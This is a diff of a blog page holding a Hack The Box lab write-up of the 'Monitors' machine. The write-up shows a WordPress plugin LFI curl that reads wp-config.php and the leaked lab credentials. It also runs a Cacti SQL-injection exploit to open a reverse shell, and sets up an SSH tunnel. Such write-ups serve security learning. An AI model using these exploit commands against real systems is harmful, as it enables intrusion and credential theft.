@@ -3,49 +3,108 @@
 <head>
 
     <title>HTB Write-up | Monitors</title>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="HandheldFriendly" content="True" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=aa2daa7cee.css" />
-
-    <link rel="canonical" href="index.html" />
-    <meta name="referrer" content="no-referrer-when-downgrade" />
-    <link rel="amphtml" href="amp/index.html" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Monitors" />
-    <meta property="og:description" content="Retired machine can be found here.ScanningLet&#x27;s start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s" />
-    <meta property="og:url" content="inesmartins.github.io/htb-write-up-monitors/" />
-    <meta property="og:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png" />
-    <meta property="article:published_time" content="2021-10-09T16:17:00.000Z" />
-    <meta property="article:modified_time" content="2021-12-31T11:16:26.000Z" />
-    <meta property="article:tag" content="htb" />
-    <meta property="article:tag" content="wordpress" />
-    <meta property="article:tag" content="wpscan" />
-    <meta property="article:tag" content="wp-with-spritz" />
-    <meta property="article:tag" content="LFI" />
-    <meta property="article:tag" content="cacti" />
-    <meta property="article:tag" content="rce" />
-    <meta property="article:tag" content="sqli" />
-    <meta property="article:tag" content="sql injection" />
-    <meta property="article:tag" content="docker" />
-    <meta property="article:tag" content="apache ofbiz" />
-    <meta property="article:tag" content="metasploit" />
-    <meta property="article:tag" content="privesc" />
+    <link rel="preload" as="style" href="../assets/built/screen.css%3Fv=e213fc6d24.css">
+    <link rel="preload" as="script" href="../assets/built/source.js%3Fv=e213fc6d24">
     
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Monitors" />
-    <meta name="twitter:description" content="Retired machine can be found here.ScanningLet&#x27;s start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s" />
-    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-monitors/" />
-    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png" />
-    <meta name="twitter:label1" content="Written by" />
-    <meta name="twitter:data1" content="Inês Martins" />
-    <meta name="twitter:label2" content="Filed under" />
-    <meta name="twitter:data2" content="htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc" />
-    <meta property="og:image:width" content="598" />
-    <meta property="og:image:height" content="378" />
+    <link rel="preload" as="font" type="font/woff2" href="../assets/fonts/inter-roman.woff2%3Fv=e213fc6d24" crossorigin="anonymous">
+<style>
+    @font-face {
+        font-family: "Inter";
+        font-style: normal;
+        font-weight: 100 900;
+        font-display: optional;
+        src: url(../assets/fonts/inter-roman.woff2%3Fv=e213fc6d24) format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+</style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=e213fc6d24.css">
+
+    <style>
+        :root {
+            --background-color: #ffffff
+        }
+    </style>
+
+    <script>
+        /* The script for calculating the color contrast has been taken from
+        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
+        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
+        accentColor = accentColor.trim().slice(1);
+
+        if (accentColor.length === 3) {
+            accentColor = accentColor[0] + accentColor[0] + accentColor[1] + accentColor[1] + accentColor[2] + accentColor[2];
+        }
+
+        var r = parseInt(accentColor.substr(0, 2), 16);
+        var g = parseInt(accentColor.substr(2, 2), 16);
+        var b = parseInt(accentColor.substr(4, 2), 16);
+        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
+        var textColor = (yiq >= 128) ? 'dark' : 'light';
+
+        document.documentElement.className = `has-${textColor}-text`;
+    </script>
+
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="HTB Write-up | Monitors">
+    <meta property="og:description" content="Retired machine can be found here.
+
+
+Scanning
+
+Let&#x27;s start the same as always, with a basic nmap scan:
+
+~ nmap -sC -sV -A 10.10.10.238
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
+Nmap scan report for 10.10.10.238
+Host is up (0.">
+    <meta property="og:url" content="inesmartins.github.io/htb-write-up-monitors/">
+    <meta property="og:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png">
+    <meta property="article:published_time" content="2021-10-09T16:17:00.000Z">
+    <meta property="article:modified_time" content="2021-12-31T11:16:26.000Z">
+    <meta property="article:tag" content="htb">
+    <meta property="article:tag" content="wordpress">
+    <meta property="article:tag" content="wpscan">
+    <meta property="article:tag" content="wp-with-spritz">
+    <meta property="article:tag" content="LFI">
+    <meta property="article:tag" content="cacti">
+    <meta property="article:tag" content="rce">
+    <meta property="article:tag" content="sqli">
+    <meta property="article:tag" content="sql injection">
+    <meta property="article:tag" content="docker">
+    <meta property="article:tag" content="apache ofbiz">
+    <meta property="article:tag" content="metasploit">
+    <meta property="article:tag" content="privesc">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="HTB Write-up | Monitors">
+    <meta name="twitter:description" content="Retired machine can be found here.
+
+
+Scanning
+
+Let&#x27;s start the same as always, with a basic nmap scan:
+
+~ nmap -sC -sV -A 10.10.10.238
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
+Nmap scan report for 10.10.10.238
+Host is up (0.">
+    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-monitors/">
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.15.48.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Inês Martins">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc">
+    <meta property="og:image:width" content="598">
+    <meta property="og:image:height" content="378">
     
     <script type="application/ld+json">
 {
@@ -65,16 +124,8 @@
     "author": {
         "@type": "Person",
         "name": "Inês Martins",
-        "image": {
-            "@type": "ImageObject",
-            "url": "inesmartins.github.io/content/images/2022/08/1658857349956.jpeg",
-            "width": 420,
-            "height": 420
-        },
         "url": "inesmartins.github.io/author/ines/",
-        "sameAs": [
-            "https://www.linkedin.com/in/ines-af-martins/"
-        ]
+        "sameAs": []
     },
     "headline": "HTB Write-up | Monitors",
     "url": "inesmartins.github.io/htb-write-up-monitors/",
@@ -87,17 +138,14 @@
         "height": 378
     },
     "keywords": "htb, wordpress, wpscan, wp-with-spritz, LFI, cacti, rce, sqli, sql injection, docker, apache ofbiz, metasploit, privesc",
-    "description": "&gt; Retired machine can be found here [https://app.hackthebox.eu/machines/Monitors].\nScanning\nLet&#x27;s start the same as always, with a basic nmap scan:\n\n~ nmap -sC -sV -A 10.10.10.238\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST\nNmap scan report for 10.10.10.238\nHost is up (0.32s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "inesmartins.github.io/"
-    }
+    "description": "Retired machine can be found here.\n\n\nScanning\n\nLet&#x27;s start the same as always, with a basic nmap scan:\n\n~ nmap -sC -sV -A 10.10.10.238\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST\nNmap scan report for 10.10.10.238\nHost is up (0.32s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)\n|   256 69:43:37:6a:",
+    "mainEntityOfPage": "inesmartins.github.io/htb-write-up-monitors/"
 }
     </script>
 
-    <meta name="generator" content="Ghost 4.7" />
-    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
-    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+    <meta name="generator" content="Ghost 6.10">
+    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.56/umd/portal.min.js" data-i18n="true" data-ghost="inesmartins.github.io/" data-key="592cb4e4fa1ab0f3f4adbed719" data-api="inesmartins.github.io/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
 .gh-post-upgrade-cta {
     display: flex;
     flex-direction: column;
@@ -161,6 +209,12 @@
 .gh-post-upgrade-cta a.gh-btn:hover {
     opacity: 0.92;
 }</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="592cb4e4fa1ab0f3f4adbed719" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="inesmartins.github.io/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="inesmartins.github.io/webmentions/receive/" rel="webmention">
+    <script defer src="../public/cards.min.js%3Fv=e213fc6d24"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css%3Fv=e213fc6d24.css">
+    <script defer src="../public/member-attribution.min.js%3Fv=e213fc6d24"></script><style>:root {--ghost-accent-color: #000000;}</style>
     <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
 <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
 <!-- Injects copyright and footer -->
@@ -193,91 +247,80 @@
     	    margin: 20px auto;
 	    }
     }
-</style><style>:root {--ghost-accent-color: #000000;}</style>
+</style>
 
 </head>
-<body class="post-template tag-htb tag-wordpress tag-wpscan tag-wp-with-spritz tag-lfi tag-cacti tag-rce tag-sqli tag-sql-injection tag-docker tag-apache-ofbiz tag-metasploit tag-privesc">
-<div class="viewport">
+<body class="post-template tag-htb tag-wordpress tag-wpscan tag-wp-with-spritz tag-lfi tag-cacti tag-rce tag-sqli tag-sql-injection tag-docker tag-apache-ofbiz tag-metasploit tag-privesc tag-hash-import-2026-01-03-19-09 has-sans-title has-sans-body">
 
-    <header id="gh-head" class="gh-head has-cover">
-        <nav class="gh-head-inner inner gh-container">
+<div class="gh-viewport">
+    
+    <header id="gh-navigation" class="gh-navigation is-middle-logo gh-outer">
+    <div class="gh-navigation-inner gh-inner">
 
-            <div class="gh-head-brand">
-                <a class="gh-head-logo" href="../index.html">
-                        
-                </a>
-                <a class="gh-burger" role="button">
-                    <div class="gh-burger-box">
-                        <div class="gh-burger-inner"></div>
-                    </div>
-                </a>
-            </div>
-            <div class="gh-head-menu">
-                <ul class="nav">
+        <div class="gh-navigation-brand">
+            <a class="gh-navigation-logo is-title" href="../index.html">
+                    
+            </a>
+            <button class="gh-burger gh-icon-button" aria-label="Menu">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z"></path></svg>                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M205.66,194.34a8,8,0,0,1-11.32,11.32L128,139.31,61.66,205.66a8,8,0,0,1-11.32-11.32L116.69,128,50.34,61.66A8,8,0,0,1,61.66,50.34L128,116.69l66.34-66.35a8,8,0,0,1,11.32,11.32L139.31,128Z"></path></svg>            </button>
+        </div>
+
+        <nav class="gh-navigation-menu">
+            <ul class="nav">
     <li class="nav-home"><a href="../index.html">Home</a></li>
     <li class="nav-about"><a href="../about-me/index.html">About</a></li>
 </ul>
 
-            </div>
-            <div class="gh-head-actions">
-                <div class="gh-social">
-                </div>
-
-                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
-            </div>
         </nav>
-    </header>
 
-    <main>
-        
-
-
-
-<article class="article post tag-htb tag-wordpress tag-wpscan tag-wp-with-spritz tag-lfi tag-cacti tag-rce tag-sqli tag-sql-injection tag-docker tag-apache-ofbiz tag-metasploit tag-privesc">
-
-    <header class="article-header gh-canvas">
-
-        <section class="article-tag">
-            <a href="../tag/htb/index.html">htb</a>
-        </section>
-
-        <h1 class="article-title">HTB Write-up | Monitors</h1>
-
-
-        <div class="article-byline">
-            <section class="article-byline-content">
-                <ul class="author-list">
-                    <li class="author-list-item">
-                        <a href="../author/ines/index.html" class="author-avatar">
-                            <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                        </a>
-                    </li>
-                </ul>
-                <div class="article-byline-meta">
-                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
-                    <div class="byline-meta-content">
-                        <time class="byline-meta-date" datetime="2021-10-09">Oct 9, 2021</time>
-                        <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
-                    </div>
-                </div>
-            </section>
+        <div class="gh-navigation-actions">
         </div>
 
-        <figure class="article-image">
-            <img
-                srcset="../content/images/size/w300/2021/12/Screenshot-2021-12-31-at-11.15.48.png 300w,
-                       ../content/images/size/w600/2021/12/Screenshot-2021-12-31-at-11.15.48.png 600w,
-                      ../content/images/size/w1000/2021/12/Screenshot-2021-12-31-at-11.15.48.png 1000w,
-                     ../content/images/size/w2000/2021/12/Screenshot-2021-12-31-at-11.15.48.png 2000w"
-                sizes="(min-width: 1400px) 1400px, 92vw"
-                src="../content/images/size/w2000/2021/12/Screenshot-2021-12-31-at-11.15.48.png"
-                alt="HTB Write-up | Monitors"
-            />
-        </figure>
-    </header>
+    </div>
+</header>
 
-    <section class="gh-content gh-canvas">
-        <blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Let's start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238
+    
+
+<main class="gh-main">
+
+    <article class="gh-article post tag-htb tag-wordpress tag-wpscan tag-wp-with-spritz tag-lfi tag-cacti tag-rce tag-sqli tag-sql-injection tag-docker tag-apache-ofbiz tag-metasploit tag-privesc tag-hash-import-2026-01-03-19-09">
+
+        <header class="gh-article-header gh-canvas">
+
+                <a class="gh-article-tag" href="../tag/htb/index.html">htb</a>
+            <h1 class="gh-article-title is-title">HTB Write-up | Monitors</h1>
+
+            <div class="gh-article-meta">
+                <div class="gh-article-author-image instapaper_ignore">
+                            <a href="../author/ines/index.html"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
+</a>
+                </div>
+                <div class="gh-article-meta-wrapper">
+                    <h4 class="gh-article-author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
+                    <div class="gh-article-meta-content">
+                        <time class="gh-article-meta-date" datetime="2021-10-09">09 Oct 2021</time>
+                            <span class="gh-article-meta-length"><span class="bull">—</span> 9 min read</span>
+                    </div>
+                </div>
+            </div>
+
+                <figure class="gh-article-image">
+        <img
+            srcset="../content/images/size/w320/2021/12/Screenshot-2021-12-31-at-11.15.48.png 320w,
+                   ../content/images/size/w600/2021/12/Screenshot-2021-12-31-at-11.15.48.png 600w,
+                  ../content/images/size/w960/2021/12/Screenshot-2021-12-31-at-11.15.48.png 960w,
+                 ../content/images/size/w1200/2021/12/Screenshot-2021-12-31-at-11.15.48.png 1200w,
+                ../content/images/size/w2000/2021/12/Screenshot-2021-12-31-at-11.15.48.png.png 2000w"
+            sizes="(max-width: 1200px) 100vw, 1120px"
+            src="../content/images/size/w1200/2021/12/Screenshot-2021-12-31-at-11.15.48.png"
+            alt="HTB Write-up | Monitors"
+        >
+    </figure>
+
+        </header>
+
+        <section class="gh-content gh-canvas is-body">
+            <blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors?ref=localhost">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Let's start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238
 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
 Nmap scan report for 10.10.10.238
@@ -295,9 +338,9 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There's an <code>Apache</code> web server running on port 80 but we can't access it with the IP alone:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image.png" class="kg-image" alt loading="lazy" width="723" height="179" srcset="../content/images/size/w600/2021/05/image.png 600w, ../content/images/2021/05/image.png 723w" sizes="(min-width: 720px) 720px"></figure><p>Luckily the virtual host is pretty obvious:</p><pre><code>~ sudo nano /etc/hosts
 
 ...
-10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-2.png" class="kg-image" alt loading="lazy" width="1440" height="720" srcset="../content/images/size/w600/2021/05/image-2.png 600w, ../content/images/size/w1000/2021/05/image-2.png 1000w, ../content/images/2021/05/image-2.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>According to the footer the website was built using Wordpress, so let's run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-19.png" class="kg-image" alt loading="lazy" width="726" height="341" srcset="../content/images/size/w600/2021/05/image-19.png 600w, ../content/images/2021/05/image-19.png 726w" sizes="(min-width: 720px) 720px"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-55.png" class="kg-image" alt loading="lazy" width="877" height="551" srcset="../content/images/size/w600/2021/05/image-55.png 600w, ../content/images/2021/05/image-55.png 877w"></figure><hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we're able to access their home directory, but we can't read <code>user.txt</code>. </p><p>Let's try to read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-51.png" class="kg-image" alt loading="lazy" width="959" height="813" srcset="../content/images/size/w600/2021/05/image-51.png 600w, ../content/images/2021/05/image-51.png 959w"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: 'wordpress'
+10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-2.png" class="kg-image" alt loading="lazy" width="1440" height="720" srcset="../content/images/size/w600/2021/05/image-2.png 600w, ../content/images/size/w1000/2021/05/image-2.png 1000w, ../content/images/2021/05/image-2.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>According to the footer the website was built using Wordpress, so let's run <a href="https://wpscan.com/wordpress-security-scanner?ref=localhost">wpscan</a>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/05/image-19.png" class="kg-image" alt loading="lazy" width="726" height="341" srcset="../content/images/size/w600/2021/05/image-19.png 600w, ../content/images/2021/05/image-19.png 726w" sizes="(min-width: 720px) 720px"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt?ref=localhost">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544?ref=localhost">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-55.png" class="kg-image" alt loading="lazy" width="877" height="551" srcset="../content/images/size/w600/2021/05/image-55.png 600w, ../content/images/2021/05/image-55.png 877w"></figure><hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we're able to access their home directory, but we can't read <code>user.txt</code>. </p><p>Let's try to read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-51.png" class="kg-image" alt loading="lazy" width="959" height="813" srcset="../content/images/size/w600/2021/05/image-51.png 600w, ../content/images/2021/05/image-51.png 959w"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: 'wordpress'
 DB_USER: 'wpadmin'
-DB_PASSWORD: 'BestAdministrator@2020!'</code></pre><p>Unfortunately, we don't have permissions to access the database locally and can't access the service from a remote machine. So, let's try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os
+DB_PASSWORD: 'BestAdministrator@2020!'</code></pre><p>Unfortunately, we don't have permissions to access the database locally and can't access the service from a remote machine. So, let's try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list?ref=localhost">handy list</a>:</p><pre><code class="language-python">import os
 
 baseurl = 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=/'
 
@@ -308,7 +351,7 @@ for entry in entries:
 	os.system('curl ' + baseurl + entry + ' -O')</code></pre><p>After some trial and error we finally get something interesting on <code>etc/apache2/sites-enabled/000-default.conf</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-67.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="exploring-cacti-admin">Exploring cacti-admin</h2><p>Let's configure our new virtual host and access the website:</p><pre><code>~ sudo nano /etc/hosts
 
 ...
-10.10.10.238    cacti-admin.monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-68.png" class="kg-image" alt loading="lazy" width="1440" height="747" srcset="../content/images/size/w600/2021/05/image-68.png 600w, ../content/images/size/w1000/2021/05/image-68.png 1000w, ../content/images/2021/05/image-68.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Luckily we can use the credentials we found on the last step and get in: <code>admin</code>/<code>BestAdministrator@2020!</code></p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-71.png" class="kg-image" alt loading="lazy" width="1440" height="647" srcset="../content/images/size/w600/2021/05/image-71.png 600w, ../content/images/size/w1000/2021/05/image-71.png 1000w, ../content/images/2021/05/image-71.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the source code, we see that this application is using <a href="https://github.com/Cacti/cacti/releases/tag/release%2F1.2.12">Cacti version 1.2.12</a>, which has a lot of known vulnerabilities including an RCE via SQL Injection.</p><p>And better yet, there's a <a href="https://www.exploit-db.com/exploits/49810">working payload on ExploitDB</a>:</p><pre><code>~ python cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.122 --lport 4444
+10.10.10.238    cacti-admin.monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-68.png" class="kg-image" alt loading="lazy" width="1440" height="747" srcset="../content/images/size/w600/2021/05/image-68.png 600w, ../content/images/size/w1000/2021/05/image-68.png 1000w, ../content/images/2021/05/image-68.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Luckily we can use the credentials we found on the last step and get in: <code>admin</code>/<code>BestAdministrator@2020!</code></p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-71.png" class="kg-image" alt loading="lazy" width="1440" height="647" srcset="../content/images/size/w600/2021/05/image-71.png 600w, ../content/images/size/w1000/2021/05/image-71.png 1000w, ../content/images/2021/05/image-71.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the source code, we see that this application is using <a href="https://github.com/Cacti/cacti/releases/tag/release%2F1.2.12?ref=localhost">Cacti version 1.2.12</a>, which has a lot of known vulnerabilities including an RCE via SQL Injection.</p><p>And better yet, there's a <a href="https://www.exploit-db.com/exploits/49810?ref=localhost">working payload on ExploitDB</a>:</p><pre><code>~ python cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.122 --lport 4444
 [+] Connecting to the server...
 [+] Retrieving CSRF token...
 [+] Got CSRF token: sid:105acde9cf997ef401f3eaaf5a884e62c9776fa1,1620939044
@@ -378,20 +421,20 @@ root       2006  0.1  0.2 628508  8864 ?        Sl   11:42   0:15 /usr/bin/docke
 
 root       2039  0.0  0.1 108820  5768 ?        Sl   11:42   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/a2e16ca5647428c5f43ce47fd08272fd8738ed80d3db0e6cf4bcb15370bbf184 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</code></pre><p>Note that all of these are ran by <code>root</code>, and the <code>docker</code> group doesn't contain any user, which means we can't use most of the known privesc Docker vectors:</p><pre><code>$ cat /etc/group | grep docker
 docker:x:999:
-$ cat /etc/passwd | grep 999</code></pre><p>Let's see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-16.07.27.png" class="kg-image" alt loading="lazy"></figure><p>There doesn't seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container's (<code>172.17.0.2</code>) TCP port <code>8443</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-15.43.35.png" class="kg-image" alt loading="lazy"></figure><p>So we can SSH tunnel to see what's running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
+$ cat /etc/passwd | grep 999</code></pre><p>Let's see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce?ref=localhost">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-16.07.27.png" class="kg-image" alt loading="lazy"></figure><p>There doesn't seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container's (<code>172.17.0.2</code>) TCP port <code>8443</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-15.43.35.png" class="kg-image" alt loading="lazy"></figure><p>So we can SSH tunnel to see what's running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
 marcus@monitors.htb's password: 
 &gt; VerticalEdge2020
 
 ~ ps aux | grep 8443
 inesmartins      38886   0.0  0.0  4331440    648   ??  Ss   12:35PM   0:00.00 ssh -L 8443:localhost:8443 marcus@monitors.htb -fNT
-</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/05/image-92.png" class="kg-image" alt loading="lazy"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for <code>ofbiz-vm.apache.org</code>, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443
